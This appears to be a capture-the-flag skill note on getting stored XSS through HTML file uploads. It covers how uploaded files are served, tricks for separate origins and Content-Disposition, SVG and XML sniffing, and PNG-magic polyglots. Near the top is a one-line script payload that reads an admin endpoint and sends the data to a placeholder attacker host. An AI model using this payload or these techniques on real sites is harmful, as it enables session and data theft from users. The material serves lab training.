# HTML Upload — the file that IS a page

## The shape — upload `.html`, it serves as `text/html`

The simplest stored-XSS path: if the app stores and serves the file with
`Content-Type: text/html` on the app's own origin, everything in it runs
in the app's session context — cookies, tokens, the admin's view.

```html
<!doctype html><script>fetch('/admin/flag').then(r=>r.text()).then(t=>location='//YOU:8000/'+btoa(t))</script>
```

## The serving check — the three questions

```
fetch the uploaded file →
  Content-Type: text/html?        (application/octet-stream forces download — dead for XSS)
  Content-Disposition: attachment? (download instead of render — dead for XSS)
  X-Content-Type-Options: nosniff? (blocks type upgrade via sniffing)
  served on app origin or separate host?  (separate host = no session)
```

`http_probe.py` on the file URL records all of this:

```bash
python3 tools/web/http_probe.py --challenge "$C" --class web-file-upload \
  --url "$FILE_URL" --evidence-regex 'text/html' --evidence-kind surface \
  --on-match surface --on-miss inconclusive --write-ack
```

## When the file serves on a separate origin — the sandbox host

`files.example-cdn.net` vs `app.example.com` — the html runs but in a
different origin:

- cookies don't cross — session theft dead
- BUT: phishing page on a legit-looking domain, clickjacking bait, and
  reading same-origin sibling files (`/flag.txt` on the same host via
  `fetch('flag.txt')` — if the flag lives on the files host, the html can
  read it and exfil)
- `document.domain`/postMessage bridges sometimes reconnect origins
- the files host may share cookies via `Domain=.example.com` cookie scope —
  check `Set-Cookie` domain attributes

## When `Content-Disposition: attachment` blocks render — the alternatives

- `inline` vs `attachment` param injection — if the app reflects the
  filename into the disposition header, `filename="x.html";inline` variants
- nested object/embed referencing the file — if the server honors
  `Content-Type` negotiation
- a second uploaded HTML that `iframe`s the first? — no, attachment still
  forces download
- different serving path — `/download/` forces attachment but `/view/` or
  `/raw/` serves inline — enumerate serve routes (`retrieval.md`)

## SVG inside the HTML, HTML inside the SVG — the polyglot landing

If `.svg` uploads are allowed but `.html` rejected — an SVG with
`<script>`/`onload` is the same page-context attack (`svg-attacks.md`).
If only `.txt`/`.xml` are allowed — check sniffing without `nosniff` — an
`.xml` file whose content is HTML may sniff to `text/html` on fetch.

## The "needs a victim" note

Stored XSS via upload needs a viewer — the admin bot (`ctf-shapes.md` —
the `/report` endpoint that takes your file's URL), or a real user
clicking the file link. Without a viewer the file is inert — this is
`second-order-processing.md`'s consumer rule again.

## Partially-rendered HTML — the sanitized variant

App re-serves the file through a sanitizer/template — the classic bypasses
live in `web-xss` skills (filter bypass, mutation XSS). The upload side's
job is only: get the file to the rendering path.

## MIME confusion — `.htm` + magic bytes of another type

An `.htm`/`.html` file with PNG magic at byte 0 passes magic checks while
still serving as HTML if the server maps by extension — polyglot ordering:
magic bytes first, then html after the first `\r\n` boundary where bytes
don't collide.

## Falsifiers

- every retrievable HTML serving is `attachment`/`octet-stream`/`nosniff`
  AND on a separate origin with nothing there to read
- HTML content is re-encoded/sanitized to plain text on serve

## Output to record

- served `Content-Type` + `Content-Disposition` + origin + whether a
  consumer/bot will view it
